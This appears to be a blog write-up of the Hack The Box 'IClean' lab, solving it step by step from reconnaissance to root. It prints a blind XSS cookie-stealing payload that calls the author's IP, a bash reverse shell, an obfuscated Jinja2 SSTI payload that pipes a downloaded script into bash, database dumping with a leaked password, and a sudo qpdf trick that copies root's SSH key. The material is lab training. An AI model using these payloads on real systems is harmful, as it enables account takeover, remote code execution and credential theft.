---
title: HTB-IClean
draft: false
tags:
  - htb
  - linux
  - medium
  - blind-xss
  - xss-cookie-stealing
  - ssti
  - ssti-to-shell
  - mysql
  - sudoers
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/IClean.png)

## Information Gathering
### Rustscan

Rustscan finds SSH and HTTP open on target:

`rustscan --addresses 10.10.11.12 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image.png)

### Nmap

Nmap finds nothing much:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-2.png)

## Enumeration
### HTTP - TCP 80

After adding **capiclean.htb** to `/etc/hosts`, we can access the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-1.png)

Let's use feroxbuster to hunt for hidden directories:

`sudo feroxbuster -u http://capiclean.htb -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

Feroxbuster finds more than 40 directories and among them below three directories stands out:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-3.png)

In order to access `/dashboard`, we would have to login or bypass the portal somehow. 

Below is the `/login` page. We have to figure out a way to authenticated through it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-4.png)

Feroxbuster finds one more interesting directoy:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-5.png)

`/quote` page has a form for email input and we can submit it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-6.png)

When we type in random email address and click on submit, we are redirected to `/sendMessage`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-7.png)

The message says "Your quote was sent to our management. They will reach out soon via email.". Which is implying some sort of user interaction happening here. 

This makes us to think about XSS cookie stealing. 

## Blind XSS

Let's spin up Burp Suite and intercept traffic on `/quote`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-8.png)

We can observe our input being forwarded to `/sendMessage`.

Let's check on blind XSS through the following payload. 

We will start a Python HTTP server and see if the payload below will make a connection to the Python server:

`<img src=x onerror="document.location='http://10.10.14.36:1234/'"/>`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-9.png)

Upon sending the request, within few seconds, we have a connection made:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-10.png)

This verifies Blind XSS vulnerability. Let's try stealing cookies since we don't have any credentials for the login on hand.

### Cookie Stealing


We have already covered about this on [HTB-FormulaX](https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Linux%F0%9F%90%A7/HTB-FormulaX).

Let's send the following payload through Burp Suite Intruder:

`<img src=x onerror="document.location='http://10.10.14.36:1234/?cookie=' + document.cookie"/>`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-12.png)

After waiting for few seconds, Python Web Server captures cookie from other users on the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-11.png)


Let's use Firefox's [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) to modify our cookie value. 

After adding the extension, create a new cookie with the name of **sessions** and copy-paste in the value that was retrieved.

After that, we now have access to `/dashboard`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-13.png)

## Shell as www-data
### SSTI

Let's look around what features the dashboard provides. 

`/InvoiceGenerator` will literally generate a Invoice.

We will input random data and click on generate:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-14.png)

Invoice ID is generated:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-15.png)

Now let's move on to `/QRGenerator`.

Let's copy-paste the Invoice ID:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-16.png)

Clicking on Generate, we get a QR Code Link:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-17.png)

When we copy-paste the QR link to the form below, we get a scannable Invoice:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-18.png)

Flow of this web app reminds us with the SSTI vulnerability. Let's intercept the traffic with Burp Suite:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-19.png)

We suspect either **scannable_invoice** or **qr_link** to be vulnerable to SSTI.

Let's first test on **qr_link** parameter with Burp Suite Intruder:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-20.png)

We will inject some basic SSTI payloads:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-21.png)

When we run the attack, output results are different for all the payloads:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-22.png)

When we check on response for the payload `{{77*77}}`, we can see that the result `5929` is persent, meaning this is indeed vulnerable to SSTI:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-23.png)

### Reverse Shell

Abusing SSTI, let's spawn a reverse shell. 

**revshell** file that will contain the following line of code:

```bash
bash -i >& /dev/tcp/10.10.14.36/1337 0>&1
```

This file will be used to spawn a reverse shell later:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-27.png)

From [here](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/), we found a payload that could be used.

Let's use the following payload on qr_link parameter:

```
{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.10.14.36:8000/revshell | bash")|attr("read")()}}
```

Payload above will download **revshell** file from our Python Web server and launch it, spawning reverse shell on our netcat litener.

Let's run the request through Burp Suite repeater:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-24.png)

When we run the request, we can see that web app grabbing **revshell** from our Python Web Server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-26.png)

We get reverse shell connection on our netcat listener:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-25.png)

## Privesc: www-data to consuela
### MySQL

There is a file called **app.py** in the current directory:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-28.png)

Reading the code, SQL username and password is revealed in plain-text -> **iclean**:**pxCsmnGLckUb**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-29.png)

Let's see if there is SQL running internally:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-30.png)

Port 3006 is open. This must be MySQL.

We tried connecting to mysql but somehow it is not interactive:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-31.png)

Let's execute commands in one-liner as such:

`mysql --database capiclean -e 'show databases;' -u iclean -p`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-32.png)

We will list tables for the database capiclean:

`mysql --database capiclean -e 'use capiclean; show tables;' -u iclean -ppxCsmnGLckUb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-33.png)

We will dump content inside users table:

`mysql --database capiclean -e 'use capiclean; show tables; select * from users' -u iclean -ppxCsmnGLckUb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-34.png)

Let's try cracking these hashes.

We succedeed in cracking hash for user **consuela**: **simple and clean**

`hashcat -m 1400 hash rockyou.txt`

pic here

Using the password, we can SSH in:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-35.png)

## Privesc: consuela to root
### Sudoers

Checking on commands that could be ran with sudo privilege, `/usr/bin/qpdf` is found:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-36.png)

Let's use the following command to create PDF copy of the root's id_rsa file:

`sudo /usr/bin/qpdf --qpdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-37.png)

Reading the created pdf, we can SSH private key in plain-text:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-38.png)

Save it to the local machine and SSH in as the root:

`ssh -i id_rsa root@capiclean.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/iclean/image-39.png)

## References
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Linux%F0%9F%90%A7/HTB-FormulaX
- https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/



